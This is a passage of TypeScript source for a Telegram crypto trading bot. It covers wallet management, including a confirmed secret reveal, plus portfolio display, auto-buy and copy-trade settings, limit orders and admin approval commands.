    buttons.push([Markup.button.callback("⚠️ Reveal secret", `reveal_ask_${label}`)]);

    ctx.reply(lines.join("\n"), Markup.inlineKeyboard(buttons));
  });

  bot.action(/^setprimary_(solana|evm)_(.+)$/, async (ctx) => {
    ctx.answerCbQuery();
    const [, chain, label] = ctx.match as unknown as [string, "solana" | "evm", string];
    setPrimaryWallet(db, String(ctx.from!.id), chain, label);
    await ctx.reply(`"${label}" is now your primary ${chain} wallet — auto-buy, copy-trade, and limit orders will use it.`);
    await sendChainWalletGrid(ctx, chain);
  });

  bot.action(/^werase_ask_(solana|evm)_(.+)$/, (ctx) => {
    ctx.answerCbQuery();
    const [, chain, label] = ctx.match as unknown as [string, "solana" | "evm", string];
    ctx.reply(
      `Erase "${label}" (${chain})? This removes it from the bot. If it's a seed-phrase wallet, make sure you've saved the phrase — the bot's copy is gone once the last chain using it is erased. This does NOT touch funds on-chain, only the bot's record of the wallet.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("Yes, erase it", `werase_confirm_${chain}_${label}`), Markup.button.callback("Cancel", "reveal_cancel")],
      ])
    );
  });

  bot.action(/^werase_confirm_(solana|evm)_(.+)$/, async (ctx) => {
    ctx.answerCbQuery();
    const [, chain, label] = ctx.match as unknown as [string, "solana" | "evm", string];
    const userId = String(ctx.from!.id);
    try {
      eraseWallet(vault, db, userId, chain, label);
      await ctx.reply(`Erased "${label}" (${chain}).`);
    } catch (err: any) {
      await ctx.reply(`Couldn't erase: ${err.message}`);
    }
    await sendChainWalletGrid(ctx, chain);
  });

  bot.action(/^reveal_ask_(.+)$/, (ctx) => {
    ctx.answerCbQuery();
    const label = ctx.match[1];
    ctx.reply(
      `Reveal the secret for "${label}"? It will be sent in this chat and auto-deleted after 60s, but Telegram's servers briefly hold it either way.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("Yes, show it", `reveal_confirm_${label}`), Markup.button.callback("Cancel", "reveal_cancel")],
      ])
    );
  });

  bot.action("reveal_cancel", (ctx) => {
    ctx.answerCbQuery();
    ctx.reply("Cancelled.");
  });

  bot.action(/^reveal_confirm_(.+)$/, async (ctx) => {
    ctx.answerCbQuery();
    const label = ctx.match[1];
    const userId = String(ctx.from!.id);

    // A mnemonic-backed wallet has rows on both chains sharing the phrase — reveal from whichever exists.
    const sol = getWallet(db, userId, "solana", label);
    const evm = getWallet(db, userId, "evm", label);
    const anyRow = sol ?? evm;
    if (!anyRow) return ctx.reply("No such wallet.");

    try {
      const result = revealSecret(vault, db, userId, anyRow.chain, label);
      const secretLabel = result.type === "mnemonic" ? `Seed phrase for "${label}"` : `Private key for "${label}" (${anyRow.chain})`;
      await sendSecretReveal(ctx, secretLabel, result.value);
    } catch (err: any) {
      ctx.reply(`Couldn't reveal: ${err.message}`);
    }
  });

  // --- Portfolio: across every wallet, not just the primary ---
  bot.action("wallets_portfolio", async (ctx) => {
    ctx.answerCbQuery();
    await replyPortfolio(ctx, String(ctx.from!.id));
  });

  async function replyPortfolio(ctx: any, userId: string) {
    const wallets = listWalletsFor(db, userId);
    if (wallets.length === 0) return ctx.reply("No wallets yet.", walletsMenu);

    const lines: string[] = [];
    for (const w of wallets) {
      const tag = w.is_primary ? " ⭐ primary" : "";
      if (w.chain === "solana") {
        try {
          const p = await getSolanaPortfolio(solConnection, new PublicKey(w.address));
          lines.push(`${w.label} — Solana (${w.address})${tag}:`, `  ${p.solBalance.toFixed(4)} SOL`);
          p.tokens.forEach((t) => lines.push(`  ${t.uiAmount} — ${t.mint.slice(0, 8)}...`));
        } catch (err: any) {
          lines.push(`${w.label} — Solana: couldn't fetch (${err.message})`);
        }
      } else {
        try {
          // Holdings are tracked per-user, not per-wallet — accurate for the
          // primary wallet (the only one the bot trades from today), shown
          // as a best-effort reference on non-primary wallets too.
          const known = getHoldings(db, "evm", userId);
          const p = await getEvmPortfolio(evmProvider, w.address, known);
          lines.push(`${w.label} — EVM (${w.address})${tag}:`, `  ${Number(p.ethBalance).toFixed(4)} ETH`);
          p.tokens.forEach((t) => lines.push(`  ${Number(t.balance).toFixed(4)} ${t.symbol}`));
        } catch (err: any) {
          lines.push(`${w.label} — EVM: couldn't fetch (${err.message})`);
        }
      }
      lines.push("");
    }

    ctx.reply(lines.join("\n"), homeKeyboard(getUser(db, userId)?.role === "admin"));
  }

  bot.command("portfolio", (ctx) => replyPortfolio(ctx, String(ctx.from!.id)));

  bot.command("snipe_on", (ctx) => {
    updateUserSettings(db, String(ctx.from!.id), { snipe_enabled: 1 });
    const u = getUser(db, String(ctx.from!.id))!;
    ctx.reply(`Auto-buy enabled. Snipe size: ${u.snipe_size_sol} SOL / ${u.snipe_size_eth} ETH (change with /snipe_size). Trades from your primary wallet.`);
  });

  bot.command("snipe_off", (ctx) => {
    updateUserSettings(db, String(ctx.from!.id), { snipe_enabled: 0 });
    ctx.reply("Auto-buy disabled. Detection and safety checks keep running and logging.");
  });

  bot.command("snipe_size", (ctx) => {
    const [, chain, amount] = ctx.message.text.split(" ");
    if ((chain !== "solana" && chain !== "evm") || !amount || isNaN(Number(amount))) {
      return ctx.reply("Usage: /snipe_size <solana|evm> <amount>");
    }
    updateUserSettings(db, String(ctx.from!.id), chain === "solana" ? { snipe_size_sol: Number(amount) } : { snipe_size_eth: Number(amount) });
    ctx.reply(`Snipe size for ${chain} set to ${amount}.`);
  });

  bot.command("copytrade_set", (ctx) => {
    const [, wallet] = ctx.message.text.split(" ");
    if (!wallet) return ctx.reply("Usage: /copytrade_set <wallet_address>");

    const userId = String(ctx.from!.id);
    const previous = getUser(db, userId)?.copy_target ?? null;
    updateUserSettings(db, userId, { copy_target: wallet });
    copyRegistry.addFollower(wallet);
    if (previous && previous !== wallet) copyRegistry.removeFollowerIfOrphaned(previous);

    ctx.reply(`Now mirroring trades from ${wallet} on both chains.`);
  });

  bot.command("copytrade_off", (ctx) => {
    const userId = String(ctx.from!.id);
    const previous = getUser(db, userId)?.copy_target ?? null;
    updateUserSettings(db, userId, { copy_target: null });
    if (previous) copyRegistry.removeFollowerIfOrphaned(previous);
    ctx.reply("Copy-trading stopped.");
  });

  bot.command("copytrade_config", (ctx) => {
    const [, sizeRatio, maxAmount, copySells] = ctx.message.text.split(" ");
    if (!sizeRatio || !maxAmount || (copySells !== "0" && copySells !== "1")) {
      return ctx.reply("Usage: /copytrade_config <sizeRatio 0-1> <maxAmount> <copySells:0|1>");
    }
    updateUserSettings(db, String(ctx.from!.id), {
      copy_size_ratio: Number(sizeRatio),
      copy_max_amount: Number(maxAmount),
      copy_sells: Number(copySells),
    });
    ctx.reply("Copy-trade sizing updated.");
  });

  bot.command("limit_buy", (ctx) => {
    const parts = ctx.message.text.split(" ").slice(1);
    const userId = String(ctx.from!.id);
    try {
      if (parts[0] === "solana") {
        const [, mint, poolId, triggerPrice, amount, direction] = parts;
        const id = createOrder(db, {
          userId,
          chain: "solana",
          identifier: mint,
          poolRef: poolId,
          side: "buy",
          direction: direction as "above" | "below",
          triggerPrice: Number(triggerPrice),
          amount: Number(amount),
        });
        return ctx.reply(`Order ${id} created: buy ${mint} for ${amount} SOL when price ${direction} ${triggerPrice}`);
      }
      if (parts[0] === "evm") {
        const [, tokenAddress, triggerPrice, amount, direction] = parts;
        const id = createOrder(db, {
          userId,
          chain: "evm",
          identifier: tokenAddress,
          side: "buy",
          direction: direction as "above" | "below",
          triggerPrice: Number(triggerPrice),
          amount: Number(amount),
        });
        return ctx.reply(`Order ${id} created: buy ${tokenAddress} for ${amount} ETH when price ${direction} ${triggerPrice}`);
      }
      ctx.reply("Usage:\n/limit_buy solana <mint> <poolId> <triggerPrice> <amountSOL> <above|below>\n/limit_buy evm <tokenAddress> <triggerPrice> <amountETH> <above|below>");
    } catch (err: any) {
      ctx.reply(`Couldn't create order: ${err.message}`);
    }
  });

  bot.command("limit_sell", (ctx) => {
    const parts = ctx.message.text.split(" ").slice(1);
    const userId = String(ctx.from!.id);
    try {
      if (parts[0] === "solana") {
        const [, mint, poolId, triggerPrice, amount, decimals, direction] = parts;
        const id = createOrder(db, {
          userId,
          chain: "solana",
          identifier: mint,
          poolRef: poolId,
          side: "sell",
          direction: direction as "above" | "below",
          triggerPrice: Number(triggerPrice),
          amount: Number(amount),
          decimals: Number(decimals),
        });
        return ctx.reply(`Order ${id} created: sell ${amount} of ${mint} when price ${direction} ${triggerPrice}`);
      }
      if (parts[0] === "evm") {
        const [, tokenAddress, triggerPrice, amount, decimals, direction] = parts;
        const id = createOrder(db, {
          userId,
          chain: "evm",
          identifier: tokenAddress,
          side: "sell",
          direction: direction as "above" | "below",
          triggerPrice: Number(triggerPrice),
          amount: Number(amount),
          decimals: Number(decimals),
        });
        return ctx.reply(`Order ${id} created: sell ${amount} of ${tokenAddress} when price ${direction} ${triggerPrice}`);
      }
      ctx.reply("Usage:\n/limit_sell solana <mint> <poolId> <triggerPrice> <amountTokens> <decimals> <above|below>\n/limit_sell evm <tokenAddress> <triggerPrice> <amountTokens> <decimals> <above|below>");
    } catch (err: any) {
      ctx.reply(`Couldn't create order: ${err.message}`);
    }
  });

  bot.command("orders", (ctx) => {
    const rows = db
      .prepare(`SELECT id, chain, identifier, side, direction, trigger_price, amount, status FROM limit_orders WHERE user_id = ? ORDER BY created_at DESC LIMIT 20`)
      .all(String(ctx.from!.id)) as any[];
    if (rows.length === 0) return ctx.reply("No orders yet.");
    const lines = rows.map(
      (r) => `${r.id.slice(0, 8)} [${r.status}] ${r.chain} ${r.side} ${r.identifier} ${r.direction} ${r.trigger_price} amt=${r.amount}`
    );
    ctx.reply(lines.join("\n"));
  });

  bot.command("cancel", (ctx) => {
    const [, idPrefix] = ctx.message.text.split(" ");
    if (!idPrefix) return ctx.reply("Usage: /cancel <orderId>");
    const row = db.prepare(`SELECT id FROM limit_orders WHERE id LIKE ? AND user_id = ?`).get(`${idPrefix}%`, String(ctx.from!.id)) as any;
    if (!row) return ctx.reply("No matching order.");
    cancelOrder(db, row.id);
    ctx.reply(`Cancelled ${row.id}.`);
  });

  // --- Admin commands ---
  bot.command("admin_pending", (ctx) => {
    if (!requireAdmin(ctx)) return;
    const pending = listPendingUsers(db);
    if (pending.length === 0) return ctx.reply("No one waiting.");
    const lines = pending.map((u) => `${u.telegram_id} (@${u.username ?? "?"}) — /admin_approve ${u.telegram_id}`);
    ctx.reply(lines.join("\n"));
  });

  bot.command("admin_approve", (ctx) => {
    if (!requireAdmin(ctx)) return;
    const [, telegramId] = ctx.message.text.split(" ");
    if (!telegramId) return ctx.reply("Usage: /admin_approve <telegram_id>");
    setUserStatus(db, telegramId, "active");
    ctx.reply(`Approved ${telegramId}.`, Markup.inlineKeyboard([[Markup.button.callback("Admin", "home_admin")], [Markup.button.callback("Home", "home")]]));
    bot.telegram.sendMessage(
      telegramId,
      "You've been approved. Your Maestro menu is ready.",
      Markup.inlineKeyboard([[Markup.button.callback("Open menu", "home")]])
    ).catch(() => {
      /* they may not have a DM open yet; approval still went through */
    });
  });

  bot.action(/^approve_(.+)$/, (ctx) => {
    if (!requireAdmin(ctx)) return ctx.answerCbQuery();
    ctx.answerCbQuery();
    const telegramId = ctx.match[1];
    setUserStatus(db, telegramId, "active");
    ctx.reply(`Approved ${telegramId}.`, Markup.inlineKeyboard([[Markup.button.callback("Admin", "home_admin")], [Markup.button.callback("Home", "home")]]));
    bot.telegram.sendMessage(
      telegramId,
      "You've been approved. Your Maestro menu is ready.",
      Markup.inlineKeyboard([[Markup.button.callback("Open menu", "home")]])
    ).catch(() => {
      /* they may not have a DM open yet; approval still went through */
    });
  });

  bot.command("admin_users", (ctx) => {
    if (!requireAdmin(ctx)) return;
    const users = listUsers(db);
    if (users.length === 0) return ctx.reply("No users yet.");
    const lines = users.map(
      (u) =>
        `${u.telegram_id} (@${u.username ?? "?"}) [${u.role}/${u.status}] snipe=${u.snipe_enabled ? "on" : "off"} copy=${u.copy_target ?? "-"}`
    );
    ctx.reply(lines.join("\n"));
  });

  bot.command("admin_ban", (ctx) => {
    if (!requireAdmin(ctx)) return;
    const [, telegramId] = ctx.message.text.split(" ");
    if (!telegramId) return ctx.reply("Usage: /admin_ban <telegram_id>");
    setUserStatus(db, telegramId, "banned");
    ctx.reply(`Banned ${telegramId}.`);
  });

  bot.command("admin_unban", (ctx) => {
    if (!requireAdmin(ctx)) return;
    const [, telegramId] = ctx.message.text.split(" ");
    if (!telegramId) return ctx.reply("Usage: /admin_unban <telegram_id>");
    setUserStatus(db, telegramId, "active");
    ctx.reply(`Unbanned ${telegramId}.`);
  });

  bot.command("admin_stats", (ctx) => {
    if (!requireAdmin(ctx)) return;
    const users = listUsers(db);
    const pending = users.filter((u) => u.status === "pending").length;
    const active = users.filter((u) => u.status === "active").length;
    const banned = users.filter((u) => u.status === "banned").length;
    const snipers = users.filter((u) => u.snipe_enabled).length;
    const copytraders = users.filter((u) => u.copy_target).length;
    ctx.reply(
      `Users: ${users.length} (${pending} pending, ${active} active, ${banned} banned)\nAuto-buy on: ${snipers}\nCopy-trading: ${copytraders}`
    );
  });

  return bot;
}
